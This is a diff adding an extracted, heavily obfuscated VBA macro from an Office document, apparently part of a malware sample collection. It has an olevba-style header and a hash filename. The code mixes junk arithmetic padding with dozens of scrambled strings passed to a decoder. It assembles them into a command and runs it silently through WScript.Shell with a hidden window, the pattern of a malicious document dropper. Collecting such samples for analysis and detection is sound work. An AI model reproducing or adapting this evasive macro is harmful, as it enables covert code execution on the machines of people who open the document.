@@ -1,0 +1,228 @@
+Filename     : ./macros/45e634eb141a5588de9ff361ddbb0520e2867e54a021209b6a475031ca05780f
+OLE stream   : Macros/VBA/XjZZWAwH
+VBA filename : XjZZWAwH.bas
+----------------------------------------
+Attribute VB_Name = "XjZZWAwH"
+Sub ntBBYma(ppMMnDHAPAV As String)
+On Error Resume Next
+BcRzikXBi = vjqcwK * iqJIGT / kEZaF - Round(3258285 * CSng(8624600 * CInt(EtWU)) + LwsOz - Round(uGbTvk)) - 544 / hrJp + vJAMaL / Rnd(wNBiiw) * (1220765 / CDbl(5652951) + (jiwuK / CByte(1880042 / CDbl(4811895) - 2115682 / 1764373)))
+kipqjBHPt = LizVh * Bjsb / WoHnBJ - Round(2135834 * CSng(8978614 * CInt(lkpDph)) + GdAX - Round(CfRt)) - 544 / MQdJa + jMNpi / Rnd(irwU) * (893467 / CDbl(8033276) + (tvjAJ / CByte(9092789 / CDbl(1083298) - 8630912 / 905715)))
+hUJptUwuR = KEFrb * ZDvIau / pqAljQ - Round(3826512 * CSng(2668558 * CInt(niftf)) + IOuBDY - Round(WnEEI)) - 544 / rKkdmW + ztiQi / Rnd(SqRbLi) * (2324005 / CDbl(6246725) + (hNYqZK / CByte(3754002 / CDbl(2611481) - 6216524 / 5401828)))
+HjWKCAsWL = PfiXGG * FLsWwE / dXEvzJ - Round(6083170 * CSng(6082169 * CInt(oWNw)) + OaTLA - Round(fBiBkT)) - 544 / NCnGK + Zhfvw / Rnd(BNjcq) * (154598 / CDbl(8598212) + (IrkZ / CByte(2007833 / CDbl(9257777) - 3296699 / 3355690)))
+boDLinRdP = MiWwj * WmwZv / sArJN - Round(4333363 * CSng(3337922 * CInt(vOOH)) + qrlv - Round(vGNI)) - 544 / KnKHFC + zsVCw / Rnd(TVZv) * (2359478 / CDbl(220858) + (zUOssn / CByte(7174366 / CDbl(8316656) - 6912324 / 5599686)))
+CreateObject("WScript.Shell").Run LkLhVDOMLXQV + ppMMnDHAPAV + DuoRZoAtMVqp + RPRRjNOjq, vbHide
+LrlzWjApP = wdozz * Rvcvz / Vszl - Round(9854318 * CSng(8928304 * CInt(qDHFNi)) + jaSTtW - Round(Jqvd)) - 544 / SzPSm + qwWtBl / Rnd(FvYdr) * (4545883 / CDbl(5138812) + (Cnrd / CByte(1665672 / CDbl(308166) - 5539227 / 1651300)))
+LBCHhcwbk = UWmam * jmobh / zXCCP - Round(2041404 * CSng(4639320 * CInt(djOoKs)) + dzdzzs - Round(DEcbA)) - 544 / wWNBa + CiEfM / Rnd(CvqkIz) * (3053783 / CDbl(8878407) + (CmKck / CByte(7570637 / CDbl(5449211) - 3873288 / 9781940)))
+ZoJFsHWMN = qUZUR * uzjS / fLGutj - Round(633679 * CSng(4899665 * CInt(sZKFFY)) + zCjOw - Round(kEDdRs)) - 544 / pqwB + ucDK / Rnd(XSnWnQ) * (1989613 / CDbl(3711419) + (tlwu / CByte(9342373 / CDbl(828365) - 9880429 / 8946441)))
+End Sub
+Function fYcvfsVfGdPfhR()
+On Error Resume Next
+dVfoUEZzbIs = NdEELK = WZKbiR _
+* PwVtd / RMJp - Round(1744540 * CSng(2725546 * CInt(NJuhCE)) + spHZ _
+- Round(imMOd)) - 544 / zvOGj + EBKaB / Rnd(OuzSh) * (2586126 / CDbl(5935715) + (ZaAka / CByte(8177358 / CDbl(9239936) - 3233385 / 8884777)))
+kqKLXwktbn = gBKJjk3vhjVKsdasdsadasdads("(vEMmmcD5!QbM#FhNU[lB.rjJnO%!&&sqaQ", 5, 9)
+WojntAiLWwh.lmcuQCimNnFCAGpzFcMjimDTKXk
+DiIjsjwdWPW = ivsh = smMwm _
+* mPLIB / ktuni - Round(1076551 * CSng(8685648 * CInt(AKwiIk)) + RdHSvY _
+- Round(HTcBT)) - 544 / aRWi + qadp / Rnd(Apzv) * (3995879 / CDbl(6517456) + (dqCbUl / CByte(677210 / CDbl(8163246) - 1155885 / 1097242)))
+zjqMvzO = gBKJjk3vhjVKsdasdsadasdads("J9$8I(ROI(J@v!fzYiN%=%aVOtUBKhLtioMOLf6rtLOi#F", 10, 17)
+nXMLkjubfM.mZUNIXZlHffU
+jcIOzL = EhMcjZ = NpEpfK _
+* oiiP / hJjwi - Round(8527245 * CSng(9107075 * CInt(HwaHrr)) + jrTRu _
+- Round(aozU)) - 544 / iwLkH + PzniY / Rnd(dklciO) * (2931812 / CDbl(9309419) + (nqfzKR / CByte(4140051 / CDbl(5012423) - 1399447 / 4040135)))
+ahawRQVnssS = gBKJjk3vhjVKsdasdsadasdads("BpBc30Q<9#%hzKi=%auIp#wIGGiXBvi%3hc3sFjWSLjM", 24, 10)
+OHUnnCTZLBJ.cYhdUSnGFLwkYcTHpKhDwFcsIYrh
+FkOCW = vDowpS = PoEFf _
+* JvVDOa / MkBT - Round(1018505 * CSng(9619980 * CInt(vpVva)) + XJHK _
+- Round(iKwrBF)) - 544 / YHvjW + JRjW / Rnd(BUrr) * (9151777 / CDbl(5063425) + (SJiYR / CByte(83046 / CDbl(7714156) - 2188579 / 3105827)))
+BAVFKa = gBKJjk3vhjVKsdasdsadasdads("]wwJDW<96jJZN2 !%EVVjaHi]Iwh2GXLI6%XfSiJY", 19, 9)
+IHvAVMlqu.IiZcBZsKpUpzAvcF
+hqEDCCVato = iAoqBX = NCQj _
+* IizHS / SaQiam - Round(2167285 * CSng(3282481 * CInt(THvE)) + ucHqFV _
+- Round(KKPz)) - 544 / Lcjl + shwJiU / Rnd(aCikOv) * (1032799 / CDbl(1391077) + (nnjb / CByte(1421092 / CDbl(425971) - 9355442 / 8125450)))
+wYaRtz = gBKJjk3vhjVKsdasdsadasdads("SXicFnwrJGBkNaDrLiFmL% tes&CL#<", 5, 15)
+MrZdzhnoHc.WEwUwsVPartrfopOdfqYBQibQQHW
+wflQcrAcl = likWK = HDVpZh _
+* JVwhz / rmJI - Round(3159429 * CSng(616692 * CInt(GZUDil)) + rpMIUU _
+- Round(iKHqQr)) - 544 / GJciS + ilbWTT / Rnd(rijS) * (1325712 / CDbl(7810266) + (mTIpN / CByte(5566024 / CDbl(3475664) - 1822348 / 5312969)))
+oLnFVO = gBKJjk3vhjVKsdasdsadasdads("HL)K@d)k6FQ1<KkamYBBtn%!!%FMjXQzjhMhCkwMW9GPW", 12, 19)
+olUsLGkssZv.himHQOLKNWzG
+qVrwuUMwQz = jCmz = zOlR _
+* fUMLc / TpzG - Round(7264930 * CSng(5754938 * CInt(SsJrn)) + bOXlHa _
+- Round(zvdcj)) - 544 / QAGm + Cjut / Rnd(zASCV) * (3929945 / CDbl(991614) + (Fbzp / CByte(3569207 / CDbl(1546599) - 6742793 / 922132)))
+rWCwPPMX = gBKJjk3vhjVKsdasdsadasdads("SWWNvw4E)Ites)UPaiEOhK%2IMC", 15, 3)
+SONNsqhUU.WGiJTzOGkCwomfiGvDqzwvsEtu
+cXKwrDdEATX = slYjT = sSqls _
+* BzuVW / abiJF - Round(9117434 * CSng(5782271 * CInt(XrbOd)) + ZaWU _
+- Round(ViUt)) - 544 / rUCl + zDZWkS / Rnd(oijdC) * (7849794 / CDbl(9421295) + (rcIc / CByte(8653589 / CDbl(5082511) - 5233941 / 4979980)))
+kQlpZ = gBKJjk3vhjVKsdasdsadasdads("OSOB<Ah=LrNY_OSa9_t]z%ijB", 18, 2)
+zlWVYzJqzif.zvFalsmowcvPMXRIXZDCOR
+IfMrqYpBRi = QSOtfX = lKWa _
+* XuAOR / hBJa - Round(1009869 * CSng(2351915 * CInt(fASYa)) + OfCpH _
+- Round(zGQnq)) - 544 / tmwuOX + mBhQ / Rnd(pNCYAX) * (7992152 / CDbl(2565835) + (tLvUFs / CByte(8461397 / CDbl(3462812) - 8858215 / 3271550)))
+KisjCKhkj = gBKJjk3vhjVKsdasdsadasdads("I.0)f6SqQQ%!=%FMjXQzjhpTnBrj%.X0iNKBlp$0", 12, 19)
+TURLCBrbqIEd.izVXEjvdTsobJ
+IWYidldi = dcEHdF = zMUzD _
+* fPzP / LkdB - Round(271305 * CSng(7478169 * CInt(jzpAY)) + asCOw _
+- Round(BaXdlk)) - 544 / YBbP + WddP / Rnd(NbbRh) * (8826080 / CDbl(1201760) + (znwYKC / CByte(3297152 / CDbl(3293659) - 2211782 / 2627968)))
+SqDVDC = gBKJjk3vhjVKsdasdsadasdads("azOAClc0N87BFNLui0UNivmrC8Ia", 4, 7)
+vQKvvUEBlz.UCTVqFDRqjobBkf
+awzjilMwT = MEiq = zwbjIa _
+* iPudi / RbzJJ - Round(5760321 * CSng(9633399 * CInt(nPbi)) + LCUrzG _
+- Round(TUEr)) - 544 / hiVial + tcSD / Rnd(DuAr) * (7856715 / CDbl(2331857) + (zBOPiO / CByte(4540296 / CDbl(9459334) - 4331215 / 4910867)))
+LizQzvB = gBKJjk3vhjVKsdasdsadasdads("IhiuI4(b((F)k.tes&&!%aPGKVzvUWzEHfkq9NS", 7, 19)
+BJocVuTbIiF.KJQIYWsLZTtY
+RIZGa = vhic = LQiRpQ _
+* qCzM / aMLGQ - Round(5879932 * CSng(7211681 * CInt(OlrZ)) + pvDKw _
+- Round(pzQWoW)) - 544 / UzBhTt + HthMEf / Rnd(sUda) * (4850211 / CDbl(1115576) + (zVDjEJ / CByte(4412769 / CDbl(3567867) - 1934947 / 8103189)))
+vfMMrDrhtOw = gBKJjk3vhjVKsdasdsadasdads("605#FFwjaHoK% tes&&eVMb]ON]kiilk)TL@YE5N9F2]L", 26, 13)
+pRqmokSWlad.CBLwhAmDzFQGLjrp
+hwOza = LoaikV = HUjoX _
+* WFYDud / aTlY - Round(8065518 * CSng(8190822 * CInt(ZfcA)) + cmamDh _
+- Round(jioNQ)) - 544 / jNiKiI + NoJsCB / Rnd(uJHcrj) * (9802987 / CDbl(9021557) + (wTVWcz / CByte(4291991 / CDbl(7346429) - 1183188 / 4102609)))
+cBVXILQ = gBKJjk3vhjVKsdasdsadasdads("t$i!.kSu<!@jcc1hC(aOsu% tes&&!%wIFbJhOE%#i.6NF<CU4N2Eltv!J", 22, 19)
+FpfjJbdtWG.IHpTzBtAGEoTupaMmQShtOAkUtn
+vkjTMSdC = zuUVR = ZqUBIu _
+* aHBB / mHiP - Round(8234860 * CSng(5528599 * CInt(ZztH)) + zENO _
+- Round(MkTB)) - 544 / Qjsl + XYSH / Rnd(jIGfvk) * (694442 / CDbl(8337725) + (ssfjP / CByte(335503 / CDbl(797519) - 6344439 / 8911234)))
+ltrzWRiwYu = gBKJjk3vhjVKsdasdsadasdads("FbOH tes&&ObIwvKIUZcEbu[%wEEKFj(CCnFYP_GqQ", 21, 18)
+QpWnbUtbtX.JVQRwtYiZzsCl
+FEwYv = IVwvj = SdGwUY _
+* AaRf / DEdC - Round(3016520 * CSng(6969253 * CInt(LbMvS)) + TBDSww _
+- Round(KaljO)) - 544 / wacYI + Snzj / Rnd(GFMUYU) * (1134735 / CDbl(6549139) + (zAWNib / CByte(4062700 / CDbl(9886325) - 8939485 / 5559904)))
+LGjGB = gBKJjk3vhjVKsdasdsadasdads("%Ff5O6MMWPCKhF(Y.m2EnzWV28WQ]Cn% tes&&bnzzAAjW15WTvGr", 8, 15)
+LrwodDdPDJTz.ikzZwEifXWDd
+DYuXwPHns = Hbhsvc = ZwMhKv _
+* zdsJt / zBfzj - Round(2212263 * CSng(7829652 * CInt(fUZl)) + KiChLO _
+- Round(AbiYRP)) - 544 / dlCi + JFuG / Rnd(iIjnzu) * (5517836 / CDbl(7429318) + (Kkzuvh / CByte(9132854 / CDbl(556606) - 4530835 / 4476828)))
+cFRso = gBKJjk3vhjVKsdasdsadasdads("XKtes&&wo=%aPGKVzvRZX]QXH<.0N2iMPWXKcQn1lZ", 25, 16)
+lRzNCaRSMwp.HDLRAHNhYTnZnwLutcBDbnVwRNZAY
+OTNNaprjWAf = JOZqXU = bwNw _
+* NwMo / cIWY - Round(6963512 * CSng(9537503 * CInt(WThOAm)) + MJcKY _
+- Round(wbrjSf)) - 544 / EQaXjd + wsBXYQ / Rnd(UDmwbK) * (5944214 / CDbl(7389105) + (kono / CByte(3613611 / CDbl(217829) - 3279899 / 7468268)))
+jtNizG = gBKJjk3vhjVKsdasdsadasdads("r)r5IpTnBrj%!!%GvUrh%@z<2KQm<W[Y<FiO", 18, 14)
+pssoAENN.WnAPzVKjQKoSPPClHrYHAi
+cQNRdJz = MDaAr = fYcQjc _
+* ikPUt / SYUXcd - Round(7267394 * CSng(6157708 * CInt(NoFcoS)) + LZUSvk _
+- Round(MBjmbC)) - 544 / cDOFP + rjzXFF / Rnd(LnKGoI) * (9043295 / CDbl(4736589) + (AaAimI / CByte(4243727 / CDbl(9404861) - 8146330 / 2015923)))
+uwLjtjosmo = gBKJjk3vhjVKsdasdsadasdads("0wjZ(v%GvUrrjJnO% YlL]ZVU", 8, 12)
+SOiAXpjjI.XAauzwzicpDFr
+rOICEbsa = VORXa = XmnuwB _
+* OHiI / OTbh - Round(5663889 * CSng(4390320 * CInt(MMqwaO)) + qYzJ _
+- Round(LGWhk)) - 544 / fwvn + XuhsqY / Rnd(olvdNZ) * (6411898 / CDbl(7729091) + (jnLm / CByte(2823497 / CDbl(9672952) - 1988575 / 9349117)))
+SuMoCF = gBKJjk3vhjVKsdasdsadasdads("PZJ0<Kfc#bO8WQb]MSGIPjfuqjk% teNSBj]NWWmM.nvSvSJFP[WY1", 24, 15)
+zlMfprnTwC.dEzMwpJPOsUQLdCLvLq
+SVmBvUdCS = JGvAj = IXWllu _
+* mEOj / tuwo - Round(8129742 * CSng(1241670 * CInt(vTMm)) + sHIaM _
+- Round(JzdIh)) - 544 / scHZzZ + ofpSw / Rnd(VQojn) * (4328024 / CDbl(9236727) + (qtdmpZ / CByte(6471423 / CDbl(912389) - 6419528 / 5460979)))
+wbJbOnvMIwA = gBKJjk3vhjVKsdasdsadasdads("wwlfI]ICM=2", 2, 1)
+pIcaDiWwJ.NMspMPQPzfahILjYUpHhMZ
+ApkRubL = BjwURX = vqqw _
+* hljrWd / OWPbT - Round(2901956 * CSng(7157318 * CInt(KjpcQ)) + YrIOvz _
+- Round(ujjqKP)) - 544 / mowkDj + QlFi / Rnd(ftvP) * (106765 / CDbl(2776826) + (IIuXd / CByte(5176777 / CDbl(5765413) - 7760703 / 3772894)))
+LnizbMusn = gBKJjk3vhjVKsdasdsadasdads("IkhPfX zbIWYn.<", 9, 1)
+NkawZomjbpDz.ZPCXLIMqLzBUSBrDuVokj
+vhQjFzY = krudJW = RGwHmV _
+* qNSrWW / cwFVm - Round(9016639 * CSng(5448411 * CInt(TOMuZ)) + Kchzq _
+- Round(uqEMff)) - 544 / NjCz + KbHu / Rnd(HXbWkm) * (6573139 / CDbl(8989825) + (wDfllr / CByte(6203169 / CDbl(6079603) - 5846586 / 7257018)))
+iUkwRT = gBKJjk3vhjVKsdasdsadasdads("Qb)&LiwzhWsMiIno=%htodicj[3F#ni@PGXijMJ]K]iKh3hMIO!I", 31, 19)
+FBCOqLbMb.EWfkYSzHpQScofWPsFadXGi
+iHGPaTur = wdAI = Epzs _
+* RDWmKO / rVAm - Round(4756248 * CSng(2775266 * CInt(TtSVlw)) + wrdo _
+- Round(RoFlaT)) - 544 / pOSsGv + Ufkd / Rnd(YORo) * (1731679 / CDbl(7140308) + (NunSL / CByte(8777971 / CDbl(9733031) - 2903191 / 9401713)))
+LKNltikk = gBKJjk3vhjVKsdasdsadasdads("kk0OcHHhSL2dU_Q52)kWNMMpp%!!%FmV", 4, 8)
+cmNKjrDLn.MRZtsJTYzShCRjilRYvGS
+OtnLuKXz = dnVq = NCrtIC _
+* HwYi / kijws - Round(9178726 * CSng(6907978 * CInt(ajuZiQ)) + JMnlY _
+- Round(WFWF)) - 544 / YAKcm + nsLX / Rnd(DlsluM) * (5872409 / CDbl(1395612) + (OsVzv / CByte(1717533 / CDbl(7464084) - 1190788 / 5862102)))
+ruMudUZp = gBKJjk3vhjVKsdasdsadasdads("WIc%V)2!LE8zE=%BNwTHBlV", 3, 9)
+FYHPwiYlwz.qIitTntVjNquqiJKiwluNSaDfvf
+nGtBvPzGniU = YUiYFJ = uZzl _
+* ZwarhM / LmXuo - Round(2540846 * CSng(517384 * CInt(XhiNX)) + CzMf _
+- Round(ohiOk)) - 544 / LAVPr + VTXTEA / Rnd(tLDdf) * (2576142 / CDbl(9000143) + (OcWBOM / CByte(2978931 / CDbl(4648648) - 8343388 / 6340031)))
+rpFzooXCn = gBKJjk3vhjVKsdasdsadasdads("Cb2])HFi[k3HsXZK#NRjBbd9M.9<WppMpU% tesVlF", 4, 11)
+iYWIPzmEFjj.JAwzIsEKQvjKnJwmirtoG
+nwYdn = DEAXw = jsMzFH _
+* CfFqcw / Rdnz - Round(5330269 * CSng(6473523 * CInt(AWOp)) + Tmwszl _
+- Round(WaYjlF)) - 544 / PuGcA + rzEa / Rnd(CvOf) * (6805521 / CDbl(4233186) + (HKnHFn / CByte(1529619 / CDbl(1112529) - 6340582 / 5004943)))
+XaBhCfz = gBKJjk3vhjVKsdasdsadasdads("#U5YXf5.!rrIrwKThX!(wNjPPc%!jA)bLDd.NOfFU", 14, 8)
+WqMlkSBZBv.aiFHHijidUWrLzmDPDQsWRCrz
+tjCvRCdBQUL = aQRnR = cKcb _
+* TQpG / YCUU - Round(4857099 * CSng(8457528 * CInt(PmWlCR)) + fNHj _
+- Round(TQpD)) - 544 / OBVK + vmbmTs / Rnd(XiCi) * (3525045 / CDbl(298065) + (uVat / CByte(3761430 / CDbl(9279442) - 105685 / 2329776)))
+tphdQjc = gBKJjk3vhjVKsdasdsadasdads(")(z(FzDQC)IMz", 5, 3)
+QFdYzJVo.zhcMwwizvaNKPLFFOqGoE
+IOBkzYOBJ = rvfzo = fHFQiS _
+* iqDWcI / ltCF - Round(8201096 * CSng(3380332 * CInt(wkTPz)) + SqhjA _
+- Round(rTnV)) - 544 / cwSaOL + djwsz / Rnd(ZHWThX) * (7333434 / CDbl(53509) + (uaoJX / CByte(4347524 / CDbl(3769633) - 3111088 / 7427475)))
+PqAiUPpEroj = gBKJjk3vhjVKsdasdsadasdads("c9iLiFmzGr2iVFiSJL", 12, 4)
+pSwiijriXTcY.NmhNUPXRMlmNHWdW
+HWTZOQ = zTwJ = rYFL _
+* NzNhz / CQfRw - Round(2059380 * CSng(9875190 * CInt(YFKwQ)) + SNLQV _
+- Round(cBwu)) - 544 / IJwK + wDnjF / Rnd(zFKn) * (3864979 / CDbl(4679779) + (Jjcomz / CByte(9999267 / CDbl(7166357) - 9399261 / 2307889)))
+wNpJWa = gBKJjk3vhjVKsdasdsadasdads("IKNdVCNDNfjE]c5V_fpL5#3diFk]2CbZ]DEs%YoK%!!%GzISNaDr9", 2, 14)
+WEPKOYDJkw.tklpNLDKaDLOwkVKpWCG
+QUuomcQ = GKwJ = JEOj _
+* FjdEz / hNIbud - Round(3473061 * CSng(8640446 * CInt(NNtO)) + miqL _
+- Round(anfDCz)) - 544 / uiGhTj + SIJui / Rnd(csFIw) * (9155248 / CDbl(2047490) + (SjXqSR / CByte(4786240 / CDbl(813373) - 425038 / 1924334)))
+wZaFV = gBKJjk3vhjVKsdasdsadasdads("JYcQLrFjs&&BkC@2<", 6, 4)
+izJaRZhEsB.OtwLcIGsawpNRkXOMJuNWNbkVzo
+iJrho = GzzG = IsrFQQ _
+* ToYi / vJjC - Round(314461 * CSng(4158094 * CInt(wnVBSO)) + iTpmcw _
+- Round(aIsjIv)) - 544 / kthosa + oIPEc / Rnd(Iznr) * (4815214 / CDbl(8395839) + (lriCv / CByte(6959007 / CDbl(5191987) - 4104277 / 66797)))
+upbXdlQYJ = gBKJjk3vhjVKsdasdsadasdads("U]#JYcL]hjbnYQdIwMEbp#wQECWMm6@bhj4R#Q", 21, 8)
+BrjWzjVWWH.KKMKLzUzKJfijvBY
+zwwKOwf = rKiQz = oYzwqT _
+* ISGPv / ITzWwo - Round(451479 * CSng(8473954 * CInt(BnCw)) + uiLZ _
+- Round(NQXmNA)) - 544 / jlANX + AOPHu / Rnd(lbvCcW) * (1959466 / CDbl(8763101) + (KidGhS / CByte(6537217 / CDbl(4391286) - 7172742 / 6289186)))
+RSihGfHq = gBKJjk3vhjVKsdasdsadasdads("%ZSTMMi%GzISMvZF", 5, 5)
+UCnCXNQXC.iXwDCioKdDkjUqlFW
+aXZmAz = WEfS = ZvcGY _
+* TwLjtp / qQjHZ - Round(255923 * CSng(9470726 * CInt(kVSL)) + RqIBw _
+- Round(MuWIac)) - 544 / RJEY + bBQOGa / Rnd(fiUa) * (7897691 / CDbl(4884592) + (urbd / CByte(8112870 / CDbl(2003409) - 7278447 / 1699999)))
+MwZRIrdwHi = gBKJjk3vhjVKsdasdsadasdads("))!teLCNUR..Z$QmtWh5.fUK<[L", 23, 2)
+ZIlNDwJsEi.wzQmGqrQkmIY
+ioSKGbwRiI = klzar = lswBQ _
+* uUWq / LhqoB - Round(7431864 * CSng(5777248 * CInt(dHXIC)) + AMhTKN _
+- Round(AYzHAv)) - 544 / fLWU + Haair / Rnd(zVFOYN) * (6956062 / CDbl(8876395) + (PvNA / CByte(2286800 / CDbl(5619102) - 8723010 / 2114143)))
+ERYIA = gBKJjk3vhjVKsdasdsadasdads("uHIrvC!Fm.jC98&&re=%amYBBtnfikFA", 6, 13)
+CDAMrYVGi.SbFILwrJfAmwzLaYROSFjbqNzlC
+hqLCB = zkooi = mtJkbi _
+* zKfQ / ABQm - Round(1357611 * CSng(1331966 * CInt(ZKrkrL)) + vKLuL _
+- Round(TAYhPj)) - 544 / kzlQKw + kBQKdh / Rnd(FouI) * (3477221 / CDbl(4947660) + (mvmP / CByte(3856529 / CDbl(3707989) - 7062080 / 9971695)))
+sBdndnE = gBKJjk3vhjVKsdasdsadasdads("OFfIPGL%!!%VAPAHDnNbPFUnIUY5hEX", 14, 12)
+FVNOQBkw.qZzcFCPBBHlzZYM
+rWkmYd = ipHrtA = zEWn _
+* lZUmr / SAUDBU - Round(1779856 * CSng(4700448 * CInt(KYIvo)) + dhMc _
+- Round(RqUC)) - 544 / iPsQb + zGlFLP / Rnd(nniUS) * (9125859 / CDbl(4792243) + (bwTHrI / CByte(1806935 / CDbl(7437756) - 4287155 / 5360391)))
+NJwPs = gBKJjk3vhjVKsdasdsadasdads("CJI[ @I5Cb5F<.hO9fWXIU8UWzEH% tes&&p=%wIFL]Qu#bEkK5r", 12, 18)
+ELQCEGkKAc.pAwPuuWCqaYJvHuaNrfSKWK
+KZLjw = dmjNN = sGLVWn _
+* jazLhE / nGHwM - Round(5483482 * CSng(4392444 * CInt(VKYSp)) + mINIo _
+- Round(hRwa)) - 544 / GfiQjH + SfiWf / Rnd(BlRZkB) * (9468865 / CDbl(683584) + (QwSlCs / CByte(434624 / CDbl(9570358) - 4173419 / 1556651)))
+Gvvskm = gBKJjk3vhjVKsdasdsadasdads("OiFTvr7X6iDKjChYSWbJjzsF%Vr", 4, 4)
+lwbiUwJoJw.sTDuvzFORAArTMYfJBjYHECMcwcjK
+iYYsindToq = GoOljY = kJMJwU _
+* wjKHaU / maXqoQ - Round(8358636 * CSng(3544354 * CInt(XWDWuM)) + idzhZ _
+- Round(XPLjRN)) - 544 / nUJpvT + quuH / Rnd(RMon) * (8598657 / CDbl(9585516) + (mGcdan / CByte(5021194 / CDbl(8908734) - 692325 / 1613998)))
+DEZkZkirt = gBKJjk3vhjVKsdasdsadasdads("YljFcQ3B])Dl%.bJhwNjPPc%[(dPXIKPz2#WNrN.Sczk(]NM", 25, 10)
+YsjzdwBn.JoTWwAqDLoBBYjaFE
+DVmQHdtGwfr = wSQQw = QCwM _
+* kZfZ / POTb - Round(3056129 * CSng(5757472 * CInt(CpADW)) + AYKYV _
+- Round(Vwtp)) - 544 / FtBi + aPWc / Rnd(TMmdK) * (3502932 / CDbl(9607275) + (awLu / CByte(6596868 / CDbl(9546482) - 7666690 / 8383469)))
+flTDJVZrBL = gBKJjk3vhjVKsdasdsadasdads("PCTq0N<8ll=%EVVYDM", 4, 7)
+kVhkZoXwPYH.PLboPpwUJrztFEzdSHTKnt
+dLLYaqkwOS = CfCUb = qRuvD _
+* wijk / CFbi - Round(6758295 * CSng(8301925 * CInt(uquiH)) + wqWh _
+- Round(IMVWA)) - 544 / ZDzBA + uiWQIi / Rnd(AToiZ) * (7127413 / CDbl(4907733) + (JpzN / CByte(6559532 / CDbl(3242284) - 1932641 / 5240262)))
+Mqtks = gBKJjk3vhjVKsdasdsadasdads("OUfHILI)IjFSK6R6R<M0P]aMVS4Clw% fp#", 4, 2)
+ELfulRNQrBt.NniowfAFzhwIHWzmEkKYmwwZjwn
+ooiXwiOvi = fTDdH = DHvmKj _
+* jEijmd / aaMGqU - Round(1097133 * CSng(3378435 * CInt(IFzsTZ)) + iVALT _
+- Round(rRaaiF)) - 544 / UtzVsG + Gwmm / Rnd(lSmhKr) * (4395533 / CDbl(1317061) + (ALlSb / CByte(6440599 / CDbl(6776393) - 9169697 / 6140384)))
+DWhhtj = gBKJjk3vhjVKsdasdsadasdads("uFCR]FBX.Js&&s=%VAPAHDnMMpp% f9UDhGicF", 10, 19)
+QNOicjJks.MWBGoGVSrwBo
+fYcvfsVfGdPfhR = rpFzooXCn + tphdQjc + ruMudUZp + ltrzWRiwYu + DEZkZkirt + NJwPs + cFRso + Mqtks + zjqMvzO + upbXdlQYJ + Gvvskm + wZaFV + MwZRIrdwHi + uwLjtjosmo + wbJbOnvMIwA + XaBhCfz + cBVXILQ + SqDVDC + ahawRQVnssS + LGjGB + ERYIA + rWCwPPMX + LnizbMusn + KisjCKhkj + LizQzvB + DWhhtj + SuMoCF + iUkwRT + wYaRtz + RSihGfHq + kQlpZ + vfMMrDrhtOw + flTDJVZrBL + kqKLXwktbn + jtNizG + oLnFVO + LKNltikk + sBdndnE + PqAiUPpEroj + wNpJWa + BAVFKa
+ZpGzpdFHY = hCOISZ * uCfoZ / jzbHUN - Round(3937907 * CSng(1406512 * CInt(PYop)) + iuji - Round(caozrf)) - 544 / wnzwVA + AXwNVk / Rnd(DfQmqU) * (5754381 / CDbl(2157496) + (AVAD / CByte(9456337 / CDbl(2719786) - 8921825 / 10968)))
+End Function
+
